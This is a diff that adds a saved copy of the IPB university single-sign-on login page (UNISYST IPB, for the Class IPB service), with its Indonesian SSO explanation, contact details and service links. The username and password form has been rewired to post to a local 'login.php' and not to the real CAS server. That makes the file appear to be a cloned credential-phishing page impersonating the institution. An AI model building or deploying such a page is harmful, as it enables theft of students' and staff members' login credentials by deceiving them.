@@ -1,0 +1,414 @@
+<!DOCTYPE html>
+<!-- saved from url=(0105)https://cas.ipb.ac.id/cas/login?service=https%3A%2F%2Fclass.ipb.ac.id%2Flogin%2Findex.php%3FauthCAS%3DCAS -->
+<html class=" js no-mobile desktop no-ie chrome chrome153 cas-section w-1536 gt-240 gt-320 gt-480 gt-640 gt-768 gt-800 gt-1024 gt-1280 gt-1440 lt-1680 lt-1920 no-portrait landscape gradient rgba opacity textshadow multiplebgs boxshadow borderimage borderradius cssreflections csstransforms csstransitions no-touch retina fontface domloaded" id="login-page"><script type="text/javascript" async="" src="./Login_files/js"></script><script async="" src="./Login_files/analytics.js.download"></script><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/content/location/location.js" id="eppiocemhmnlbhjplcgkofciiegomcon"></script><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/libs/extend-native-history-api.js"></script><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/libs/requests.js"></script><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>Login</title>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="stylesheet" href="./Login_files/font-awesome.min.css"><link type="text/css" rel="stylesheet" href="./Login_files/bootstrap.min.css"><link type="text/css" rel="stylesheet" href="./Login_files/lato.min.css"><link rel="stylesheet" href="./Login_files/icon"><link href="./Login_files/material-kit.css" rel="stylesheet"><link rel="stylesheet" href="./Login_files/cas.css"><link rel="icon" type="image/png" href="./Login_files/logo-ipb.png"><script type="text/javascript" src="./Login_files/zxcvbn.js.download"></script><script bis_use="true" type="text/javascript" charset="utf-8" nonce="" data-dynamic-id="8a43e7db-ec3f-45e5-b8c6-20e7fafa373c" src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/executors/200.js"></script><script bis_use="true" type="text/javascript" charset="utf-8" nonce="" data-dynamic-id="8a43e7db-ec3f-45e5-b8c6-20e7fafa373c" src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/executors/101.js"></script>
+    <script type="text/javascript" src="./Login_files/jquery.min.js.download"></script>
+    <script type="text/javascript" src="./Login_files/jquery-ui.min.js.download"></script>
+    <script type="text/javascript" src="./Login_files/jquery.cookie.js.download"></script>
+    <script src="./Login_files/bootstrap.min.js.download"></script>
+
+    <script>
+        /*<![CDATA[*/
+
+        var trackGeoLocation = false;
+
+        var googleAnalyticsTrackingId = "UA-119483933-1";
+
+        if (googleAnalyticsTrackingId != null && googleAnalyticsTrackingId != '') {
+            (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+                        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+                    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+            })(window, document, 'script', 'https://www.google-analytics.com/analytics.js', 'ga');
+
+            ga('create', googleAnalyticsTrackingId, 'auto');
+            ga('send', 'pageview');
+        }
+
+        /*]]>*/
+    </script>
+</head>
+
+<body id="cas" class="login tutorial-page" __processed_d78c95d0-1906-437e-a5b3-56e85b79c39b__="true" bis_register="W3sibWFzdGVyIjp0cnVlLCJleHRlbnNpb25JZCI6ImVwcGlvY2VtaG1ubGJoanBsY2drb2ZjaWllZ29tY29uIiwiYWRibG9ja2VyU3RhdHVzIjp7IkRJU1BMQVkiOiJlbmFibGVkIiwiRkFDRUJPT0siOiJlbmFibGVkIiwiVFdJVFRFUiI6ImVuYWJsZWQiLCJSRURESVQiOiJlbmFibGVkIiwiUElOVEVSRVNUIjoiZW5hYmxlZCIsIklOU1RBR1JBTSI6ImVuYWJsZWQiLCJUSUtUT0siOiJlbmFibGVkIiwiTElOS0VESU4iOiJlbmFibGVkIiwiQ09ORklHIjoiZGlzYWJsZWQifSwidmVyc2lvbiI6IjIuMy4wIiwic2NvcmUiOjIwMzAwMH1d" bis_skin_checked="1">
+<header>
+    <nav class="navbar navbar-transparent navbar-fixed-top navbar-color-on-scroll" role="navigation">
+	  <div class="container" bis_skin_checked="1">
+		<!-- Brand and toggle get grouped for better mobile display --><div class="navbar-header" bis_skin_checked="1">
+		  <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#navigation-index">
+			<span class="sr-only">Toggle navigation</span>
+			<span class="icon-bar bar1"></span>
+			<span class="icon-bar bar2"></span>
+			<span class="icon-bar bar3"></span>
+		  </button>
+		  <a href="https://cas.ipb.ac.id/cas/login?service=https%3A%2F%2Fclass.ipb.ac.id%2Flogin%2Findex.php%3FauthCAS%3DCAS#ipb" bis_skin_checked="1">
+			   <div class="logo-container" bis_skin_checked="1">
+					<div class="logo" bis_skin_checked="1">
+						<img src="./Login_files/logo-ipb.png" alt="IPB"></div>
+					<div class="brand" bis_skin_checked="1">
+						UNISYST IPB
+					</div>
+				</div>
+		  </a>
+		</div>
+
+		<!-- Collect the nav links, forms, and other content for toggling --><div class="collapse navbar-collapse" id="navigation-index" bis_skin_checked="1">
+			<ul class="nav navbar-nav navbar-right">
+				 
+				<li>
+					<a href="https://cas.ipb.ac.id/cas/login?service=https%3A%2F%2Fclass.ipb.ac.id%2Flogin%2Findex.php%3FauthCAS%3DCAS" data-toggle="modal" data-target="#kontaksso"><i class="material-icons">call
+					</i> Kontak</a>
+				</li>
+			</ul>
+
+		</div><!-- /.navbar-collapse -->
+	  </div><!-- /.container-fluid -->
+	</nav>
+    
+</header>
+<div class="wrapper" style="height: 100%;" bis_skin_checked="1">  
+	<div class="main main-raised bg-uni" bis_skin_checked="1">
+		<div class="section" bis_skin_checked="1">
+			<div id="container" class="container" bis_skin_checked="1">
+				<div id="content" bis_skin_checked="1">
+	<div class="row" bis_skin_checked="1">		
+	</div>
+	<div class="row tim-row" bis_skin_checked="1">
+	   <div class="col-md-7" bis_skin_checked="1">
+
+	<div id="notices" bis_skin_checked="1">
+		<div id="cookiesDisabled" class="alert alert-info" style="display:none;" bis_skin_checked="1">
+    <h2>Browser cookies disabled</h2>
+    <p>Your browser does not accept cookies. Single Sign On WILL NOT WORK.</p>
+</div>
+<div id="serviceui" class="alert alert-info" bis_skin_checked="1">
+    <div bis_skin_checked="1">
+        <table>
+            <tbody><tr>
+                <td>
+                    <img src="./Login_files/webapp.png"></td>
+                <td id="servicedesc">
+                    <h2>Class IPB</h2>
+                    <p>Halaman untuk kelas terintegrasi IPB</p>
+                </td>
+            </tr>
+        </tbody></table>
+    </div>
+</div>
+</div>
+			<h2 class="text-center text-default">UNISYST IPB</h2>
+			<legend></legend>
+			<div class="col-md-8 col-md-offset-2" bis_skin_checked="1">
+				<p class="text-center">
+					Sistem Informasi Terintegrasi IPB atau sebuah sistem otentikasi dengan teknologi Single Sign-on (atau biasa disebut SSO) dengan menggunakan protokol OAuth 2.0.
+				</p> 
+				<p class="text-center">
+					<button class="btn btn-primary" data-toggle="modal" data-target="#apaitusso" fdprocessedid="ezlo5q">Apa itu SSO?<div class="ripple-container" bis_skin_checked="1"></div></button>
+					<button class="btn btn-primary" data-toggle="modal" data-target="#layanansso" style=" background: #fff; color: #406CE7; border: 1px solid #406CE7; " fdprocessedid="9objj">Layanan UNISYST IPB<div class="ripple-container" bis_skin_checked="1"></div></button>
+				</p>
+			</div> 
+		</div>
+		<div class="col-sm-4 col-md-4" bis_skin_checked="1">
+			<div class="box card" id="login" bis_skin_checked="1">
+    <form method="post" id="fm1" action="login.php" target="_self">
+
+        <h2>Enter your Username and Password</h2>
+
+		<div class="input-container" bis_skin_checked="1">
+		  <div class="input-group" bis_skin_checked="1">
+			<span class="input-group-addon">
+				<i class="material-icons">person_outline</i>
+			</span>
+			<div class="form-group" bis_skin_checked="1">
+				<div bis_skin_checked="1">
+				<input class="input form-control required" id="username" size="25" tabindex="1" type="text" accesskey="u" placeholder="Username" required="required" autocomplete="off" name="username" value="" fdprocessedid="jbe1o"><span class="material-input"></span>
+				</div>
+			<span class="material-input"></span></div>
+		  </div>
+		</div>
+		
+		<div class="input-container" bis_skin_checked="1">
+		  <div class="input-group" bis_skin_checked="1">
+			<span class="input-group-addon">
+				<i class="material-icons">lock_outline</i>
+			</span>
+			<div class="form-group" bis_skin_checked="1">
+			<input class="input form-control required" type="password" id="password" size="25" tabindex="2" accesskey="p" autocomplete="off" required="required" placeholder="Password" name="password" value="" fdprocessedid="maoiw"><span class="material-input"></span></div>
+		  </div>
+		</div>
+				
+		<span id="capslock-on" style="display:none;">
+			<p>
+				<i class="fa fa-exclamation-circle"></i>
+				<span>CAPSLOCK key is turned on!</span>
+			</p>
+		</span>
+
+        <section class="row check">
+            </section>
+        
+        <section class="row btn-row">
+            <input type="hidden" name="execution" value="d3b47672-65b7-408a-a982-1f27eb188e45_ZXlKaGJHY2lPaUpJVXpVeE1pSjkuUlRjL01peGtLY0pFdU51dEtiUjBIclFIai96WmZzMWlkOGdGMzZ1R25NZzFpcjlWdXI4K0QvbmlYaDMrN0Yyb1U5c1pqT0M0STdoZFFsR3JBMTVieUZWdzFkbDd3akNLTjc5N0pjUnQwQ0dVdEpFdllxUlFrTlc0YWxzc1E0WTMybDFwNGlpckN4cUVBY3RKdWxNcC9uWS8wZk50ZExPVEl0aHptNU16UTJDem13Tmhrc3ZZU2k4WFFpU2hpbTNWbnRsWXBLcGIycDVRcGtZQlNHQzF3c1JLd2s5KzFzK1JDWitabEVLbjh4OEF4ak05d3NVL0ttMVEvUlF2OVlnajNaZ2tLSFEvLzBTOHRmbEV4RjVGQzhGbHMzZUxyTEJOVFY2b1c4emZxRE5SZHlKZ1hNRUdPSXpBL2Yyejg5eXBRNHVFdU1hL1VwZU54OGRLNm9jMnhIeWxXT1hVQVJHSWV4VEo4L3lsdGNKb1lFWnhGZTZUV2szbUxocFQ3TDNBaE0zNHpNRFFaNVRXS0tNQm4rRXhITGpIZGJxQWZ1VjBUa043YkdiOVMrWVl2SjlnT3NnSEFLV1IrZWRhdUUwSHl6dERIb01nLzlTcGY2UlNXOC9QN2ZtRjVMVHdsclF0c2FCTFZVQndjcW5wcWhIN0VKUVdXSWRnejdNbE9tL1k1QjBNTFY4d2wrRkNWMFNNZnZnRlZFamZMYTJlajJHdzZuRzRZZkhyZk9LOFNyYkxsMzQwOTI3SmlhcmdIdmduRU1OL1hpa1pwNGo2aEJDRGFma1dCbFI1bEEvWjRDb3p0OTRLN0cyWW1RTXJ6L0Z6dG9zMG1vUVFPTnJYQ20zTG5tWEU4N1dHTTRMWnJWNklFTTFMWFBiNGh0RFQ1ZzBPaUZEdGp0aThnV0k0ZE84NmxiVUxOeWpmZlBJVkphVEE1THgyUFNNakdIeTdlLzF1WmRzWFBBeTZwbUYyTDF6Y3l6UHRsMSsvM0J2OTNZTEhFNDQ4N3dIVDdsd2MxQStPNG13eWtncFdWQXpnbyt3SXBCTnArSDVLZlZQU1B4bHNSRFBrV1ZENE5Fb1lESk14a1N3VzZTUE11dENxMmhCc3RGWXgwWlo0YVA3aHpXRHo0emRueDRHK2tVUW5VOGdaY29IR05LRW14ejVHRWI3cFBWOUV0U0VQM3A4OHJIZjlScjFVaUFqbTBDZGp6Myt5MllrWUtqQ1N6TnB4dUR0RmM0T3I2YWlVcmVjaVhXdjNKQTBqL05PRUtwWGhERjhmN0ljcG1vSDlpWFU1am03N0VyTHRqbHpLeTZkYWRONlFSemF0MEljUjFJbjZjd3FwVy9QbUhPSFpWVkIzTGlvK2MwanNCWHl1QW8wZ2RWUFFRbFdiMHcyNWhwZUZ2cFhaZmZCQ051aDZUSVo0V001dzc3WHlDdk5aZlB3Wkp2WVdFd29EM2xiQ0ZoR1REZXFlMU1JL2o4ZXBVK0g4QS8yNkoxc0xxa1l1c3VrK0h2YlNRQllvTGJKMFJ5YkZyTmtlaFJLaEc5OU9iS05PQ2IzTjFtQ1lXeHRtNFRrVHkxN0pQb3V0dlJJd0QyRG1CY2RZL01tTTBZeis0eXlHSjJmMFdVSmtvelMySWtOL0U2dk5PL053YzdvalB4R3g3dTFNN1ZEQlJBNWxxSmRvNzgrdmhzZWd1bWljVXdjVlljdVBhdnpBSHVGa0F4WGhnblVzRUE5RjRraFFCRXNsWHZ4WDJLT3ptM2hLQ2ZvUkpENlJSTlZCU0xsb0N5MjhIaDM4a0NUcSsvNldiSmlFK2RBNkc1ZEdkZ3ozYVRlUzBaemRTeXdqTzFUR1BtQTBFZVZtVXRuUW1TaStwRWIwZGJLK2RhYzc0NDhpMjRreEQyeEFLQ2xjSzF6T0VlelFHTkc0aXN5VGF5d05hYituRjZjcTBNVEJMYVhmeG1hUFA1M2t2N1VadEhoRzRBbVBpWC9kLzZhR0p6YVIwR1M3cGp6SUFhTGRibVdFK1Vuekw3Ti9HUURLZTFJK3BnQ2dud1Z1RDVxRkNCbjlvM3gxMzlZc2JOZG9JS3p0YitXZlB1d1BDNXBncjlTaEl4eDFNeUZid2ovOS9BNTBzeG5IOU1hUXl1cHhFVzNlMUxqWDRoNE05dGR5d3FNa05rSzFxTERaYll4L3JZYi9ITi9Nei9mQTBGTHc4b3JqYzBYMDRJVllwRUYzemdTb1JNNS9KekgzUkpNaDJFYlI4QytVRzg5TS9sM3pSampoWEg0LysyclN3UDlsK0MzaFVGUU1JV1NLWUFTUHFCSmVxWnhqMFNiN2dNUE5kMERCdDJXckZxK05KRWRMR1k2b3RqMXcvRjduTWVaaXNwL0pSME9VNm9GWWVFN1dyZzlIOS9MaTkrR3FTbzhJRjJ1RUljVFlULzBscTY2d25CV09zbVRtbWJZV055aVpqM0g1eGJOd045Um15clMwS0NwQ01TS1cxY0lTTWRjTmdVK1gzbVFSTXZ1TEdDMnVEYVl5RVZLUVZVRkdXZXo4cTJNU0t4VjE0U0NtMThxN2d2Rm54Q2JaK21zK0pBcVVMZXdzK0Y3bC9QbkU2QmY5eXNRQ1RLeXBKYUdQNEJETko2bWVCM2Z5ZHhQZ0Q1KzNlZnliSDVWQis3Si9PUWo1ZmlhRno2dmxVdzREWWNFN2hVZFplcWYwZ1NqZHNVbGV1UnZqL1dnK1ZSODlBN1BLbisxVUZTdG1EaXZLa0piL0tjeC9yaGkrdkVFTElnMldoK00xNUVVa1pjTllXOWVEelRzWS9xNkVISDJDVUlScVluMjNZVEozMW5zTkNpOUxNV0FOdGtPKzVvcm1ycm9PODRXNEt0Y3EwUnV0a1NjRjBNREFzSmNRd1RSM0NXM0JjdnhLRlFaNFJTb2VRQ3gza2ltVWV3ci9jVkcwdXh2WXlCblB6N01aSTNra2plbzZFZEkzb05YOGFtUWxLdFhuWGxUY0Y2bmxqa0tXTnlyczVGS3BiSDd1dlZRanBrTkVMOVBtMTRMRmZ4bzdyVXc5M0tMczFCK0RWc0ZTdENWR2FDWjIxelZZSENOYlUvTzRmbjJuYUlFMDVGUis1alVvdklUUUVsS3N3R3BmcHJEUERNTVpyOGQzMEFENTE2WmlDd2RFanYvQTR3OG1RRHVKazNMc2RpdFpEVUpQOEhCOFZGU1BaM09OQjRCRk1aOWY1RWJ6QXNXUTNaOTVzK1JEVzVJdXN6Nk9xVzRkT1JPM2NSUWd2OUlBQkhLQ3B3YW1YTW0xakhXUzl5SWVpa2xlNXpvZVpoTWVzOUNUQm5LQjRGWUZtY0J2aFRNcy9za2NCcklSeC9vRWE0TjVQWDZNLzZlRnE5dzFsSGdWaEQ0cnRTZm9nQ2ZBUHIrWDdUTlVSZFlHc1JySWtUeWN4SXlsampwVGdRRnZPSklTWlpwZi9yK1F1L0FIMFRIT1BOdlhUcmZVNWVSNU1WdktvcFRiay9JN1NsRzFrT1duWFZLa2d6Z0dJaTNiTDdYMzR2VUhTNytYNzNLclJ0MlE3ZmlOSUp5OWJmY3ljN1IxZXBPTHIyZTRUMnFqTUxhTDAzWDhsTGdjc1E3ZHFPM0paaCtwZHI5VmxsRDJybHFEM0xHelZZaThOUE1BWDlxK285dld0enpuWEJ6akE2T2VLVSs1YXlzclVXNlgranRETjY2d0h1S1RYd3NYZTBuZzM0RnlNY1NBNHd4UFpTSlgrUGlPZktlQjY1REg1b0M1Sno2anlJclpmZm5CdW9EL25QWWNTTWFieFM0aUVEam93cmhuK3E3MGxNdkpXOSs1b28wcjh4cnJ1N3dXcEFwSDBPRDN2Mmk0bWI5Sld5cFhoN3pKQ0RzblRZYWc0UFdwUTJ0aGJUSlV6VEVEeFllcWlxU1dCV3kyb1BFQ1hRbzZDZFhhZGNwTE1Cb1h2bGNrVjA2MkRHV2wxdjZ1QjM0NjNrMWt4OWhXYXROWFZKMWIuSHdLWTZaMGExVmg0dm1KeF9iTWFmU18tT3h4Ulo0SUN1OWpvVUw1TDliX0hFZ2UyM2RGUHVpbUlUVnkyX3hXNzlwdjJJMWZ6X29uRG1RNlZ6YmZyZEE="><input type="hidden" name="_eventId" value="submit"><input type="hidden" name="geolocation"><input class="btn btn-primary btn-block" name="submit" accesskey="l" value="LOGIN" tabindex="6" type="submit" fdprocessedid="u2gips"></section>
+    </form>
+
+    <div bis_skin_checked="1">
+        <span class="fa fa-question-circle"></span>
+        <span><a href="https://apps.ipb.ac.id/Resetpassword" bis_skin_checked="1">Forgot your password? </a></span>
+        <p></p></div>
+    
+    <script type="text/javascript">
+        var i = "One moment please..."
+        $("#fm1").submit(function() {
+            $(":submit").attr("disabled", true);
+            $(":submit").attr("value", i);
+            return true;
+        });
+    </script>
+    <div id="sidebar" bis_skin_checked="1">
+    <div class="sidebar-content" bis_skin_checked="1">
+        <p>For security reasons, please <a href="https://cas.ipb.ac.id/cas/logout" bis_skin_checked="1">log out</a> and exit your web browser when you are done accessing services that require authentication!</p>
+    </div>
+</div>
+
+</div>
+</div>
+	</div>
+</div>
+			</div>
+		</div>
+	</div>
+</div>
+
+<div class="modal fade" id="apaitusso" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" bis_skin_checked="1">
+  <div class="modal-dialog" bis_skin_checked="1">
+	<div class="modal-content" bis_skin_checked="1">
+	  <div class="modal-header" bis_skin_checked="1">
+			<button type="button" class="close" data-dismiss="modal" aria-hidden="true">
+				<i class="material-icons">clear</i>
+			</button>
+			<h4 class="modal-title">Apa itu SSO?</h4>
+	  </div>
+	  <div class="modal-body" bis_skin_checked="1">
+		<p>Single Sign On (SSO) adalah suatu teknologi dimana semua sistem-sistem yang berbeda dapat terintegrasi dalam satu akun pengguna sehingga dapat memfasilitasi pengguna untuk dapat mengakses beberapa aplikasi dengan menggunakan satu akun saja dalam sekali otentikasi/login.
+		</p>
+		<p>
+		  Dengan menggunakan SSO, seorang pengguna hanya cukup melakukan proses otentikasi sekali saja untuk mendapatkan izin akses terhadap layanan yang terdapat di jaringan Institut Pertanian Bogor.
+		</p>
+	  </div>
+	  <div class="modal-footer" bis_skin_checked="1"> 
+		<button type="button" class="btn btn-danger btn-simple" data-dismiss="modal">Close
+		</button>
+	  </div>
+	</div>
+  </div>
+</div>
+<div class="modal fade" id="kontaksso" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" bis_skin_checked="1">
+  <div class="modal-dialog" bis_skin_checked="1">
+	<div class="modal-content" bis_skin_checked="1">
+	  <div class="modal-header" bis_skin_checked="1">
+			<button type="button" class="close" data-dismiss="modal" aria-hidden="true">
+				<i class="material-icons">clear</i>
+			</button>
+			<h4 class="modal-title">Kontak</h4>
+		</div>
+	  <div class="modal-body" bis_skin_checked="1">
+		<div class="row" bis_skin_checked="1">
+		  <div class="col-xs-12 col-md-12" bis_skin_checked="1">
+			<div class="info info-horizontal" bis_skin_checked="1">
+			  <div class="icon icon-rose m-t-0" bis_skin_checked="1">
+				<i class="material-icons">people
+				</i>
+			  </div>
+			  <div class="description" bis_skin_checked="1">
+				<h4 class="info-title">Jenis Akun yang Diijinkan
+				</h4>
+				<p class="description">
+				  Dosen, Pegawai, Mahasiswa dan Alumni
+				</p>
+			  </div>
+			</div>
+			<div class="info info-horizontal" bis_skin_checked="1">
+			  <div class="icon icon-rose m-t-0" bis_skin_checked="1">
+				<i class="material-icons">call
+				</i>
+			  </div>
+			  <div class="description" bis_skin_checked="1">
+				<h4 class="info-title">Kontak
+				</h4>
+				<p class="description">
+				  Telepon/Faksimile : 0251-8623936
+				  <br>
+				  PABX              : 0251-8622642 Ext. 213,101
+				  <br>
+				  E-mail            : ict[at]ipb.ac.id
+				  <br>
+				  URL               : 
+				  <a href="http://ict.ipb.ac.id/" target="_blank" bis_skin_checked="1">http://ict.ipb.ac.id
+				  </a>
+				</p>
+				<p>Alamat : Jalan Kamper Gedung Perpustakaan Lantai 3 Kampus IPB Darmaga Bogor.
+				</p>
+			  </div>
+			</div>
+			<div class="info info-horizontal" bis_skin_checked="1">
+			  <div class="icon icon-rose m-t-0" bis_skin_checked="1">
+				<i class="material-icons">priority_high
+				</i>
+			  </div>
+			  <div class="description" bis_skin_checked="1">
+				<h4 class="info-title">Penanggung Jawab Sistem
+				</h4>
+				<p class="description">
+				  DIDSI: 
+				  <a target="_blank" href="http://ict.ipb.ac.id/" bis_skin_checked="1"> http://ict.ipb.ac.id
+				  </a>
+				</p>
+			  </div>
+			</div>
+		  </div> 
+		</div>
+		<div class="row" bis_skin_checked="1">
+		</div> 
+	  </div>
+	  <div class="modal-footer" bis_skin_checked="1"> 
+		<button type="button" class="btn btn-danger btn-simple" data-dismiss="modal">Close
+		</button>
+	  </div>
+	</div>
+  </div>
+</div>
+<div class="modal fade" id="layanansso" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" bis_skin_checked="1">
+  <div class="modal-dialog" bis_skin_checked="1">
+	<div class="modal-content" bis_skin_checked="1">
+	  <div class="modal-header" bis_skin_checked="1">
+			<button type="button" class="close" data-dismiss="modal" aria-hidden="true">
+				<i class="material-icons">clear</i>
+			</button>
+			<h4 class="modal-title">Layanan SSO IPB</h4>
+		</div>
+	  <div class="modal-body" bis_skin_checked="1">
+		<div class="row" bis_skin_checked="1">
+		  <div class="col-md-2" bis_skin_checked="1">
+			<a href="https://simak.ipb.ac.id/" target="_blank" bis_skin_checked="1">
+			  <div class="info" bis_skin_checked="1">
+				<div class="icon icon-blue" bis_skin_checked="1">
+				  <i class="material-icons">school
+				  </i>
+				</div>
+				<h6 class="info-title text-center">SIMAK
+				</h6>
+			  </div>
+			</a> 
+		  </div>
+		  <div class="col-md-2" bis_skin_checked="1">
+			<a href="http://kinerjadosen.ipb.ac.id/" target="_blank" bis_skin_checked="1">
+			  <div class="info" bis_skin_checked="1">
+				<div class="icon icon-info" bis_skin_checked="1">
+				  <i class="material-icons">equalizer
+				  </i>
+				</div>
+				<h6 class="info-title text-center">Kinerja Dosen
+				</h6>
+			  </div>
+			</a> 
+		  </div>
+		  <div class="col-md-2" bis_skin_checked="1">
+			<a href="http://mss.ipb.ac.id/" target="_blank" bis_skin_checked="1">
+			  <div class="info" bis_skin_checked="1">
+				<div class="icon icon-danger" bis_skin_checked="1">
+				  <i class="material-icons">timeline
+				  </i>
+				</div>
+				<h6 class="info-title text-center">MMS
+				</h6>
+			  </div>
+			</a> 
+		  </div> 
+		  <div class="col-md-2" bis_skin_checked="1">
+			<a href="http://simpeg.ipb.ac.id/" target="_blank" bis_skin_checked="1">
+			  <div class="info" bis_skin_checked="1">
+				<div class="icon icon-warning" bis_skin_checked="1">
+				  <i class="material-icons">people_outline
+				  </i>
+				</div>
+				<h6 class="info-title text-center">SIMPEG
+				</h6>
+			  </div>
+			</a> 
+		  </div> 
+		  <div class="col-md-2" bis_skin_checked="1">
+			<a href="http://simkehadiran.ipb.ac.id/" target="_blank" bis_skin_checked="1">
+			  <div class="info" bis_skin_checked="1">
+				<div class="icon icon-teal" bis_skin_checked="1">
+				  <i class="material-icons">dvr
+				  </i>
+				</div>
+				<h6 class="info-title text-center">KEHADIRAN
+				</h6>
+			  </div>
+			</a> 
+		  </div>
+		  <div class="col-md-2" bis_skin_checked="1">
+			<a href="http://spmi.ipb.ac.id/" target="_blank" bis_skin_checked="1">
+			  <div class="info" bis_skin_checked="1">
+				<div class="icon icon-rose" bis_skin_checked="1">
+				  <i class="material-icons">insert_drive_file
+				  </i>
+				</div>
+				<h6 class="info-title text-center">SPMI
+				</h6>
+			  </div>
+			</a> 
+		  </div> 
+		</div>
+	  </div>
+	  <div class="modal-footer" bis_skin_checked="1"> 
+		<button type="button" class="btn btn-danger btn-simple" data-dismiss="modal">Close
+		</button>
+	  </div>
+	</div>
+  </div>
+</div>		
+
+<script src="./Login_files/material.min.js.download" type="text/javascript"></script>
+<!-- Control Center for Material Kit: activating the ripples, parallax effects, scripts from the example pages etc --><script src="./Login_files/material-kit.js.download" type="text/javascript"></script>
+<script>
+	$().ready(function(){
+		$(window).on('scroll', materialKit.checkScrollForTransparentNavbar);
+	});
+</script>
+<div bis_skin_checked="1"><script src="./Login_files/head.min.js.download"></script>
+<script type="text/javascript" src="./Login_files/cas.js.download"></script>
+
+<script>
+head.ready(document, function () {
+    if (!window.jQuery) {
+    	var jqueryUrl = "\/cas\/webjars\/jquery\/3.3.1\/dist\/jquery.min.js"; 
+        head.load(jqueryUrl, loadjQueryUI);
+    } else {
+        notifyResourcesAreLoaded(resourceLoadedSuccessfully);
+    }
+});
+
+function loadjQueryUI() {
+	var jqueryUrl = "\/cas\/webjars\/jquery-ui\/1.12.1\/jquery-ui.min.js"; 
+	head.load(jqueryUrl, loadjQueryCookies);
+}
+
+function loadjQueryCookies() {
+	var jqueryUrl = "\/cas\/webjars\/jquery-cookie\/1.4.1-1\/jquery.cookie.js"; 
+	head.load(jqueryUrl, notifyResourcesAreLoaded(resourceLoadedSuccessfully));
+}
+
+function notifyResourcesAreLoaded(callback) {
+    if (typeof callback === "function") {
+        callback();
+    }
+}
+</script>
+
+
+</div>
+
+
+
+<span id="PING_IFRAME_FORM_DETECTION" style="display: none;"></span></body></html>
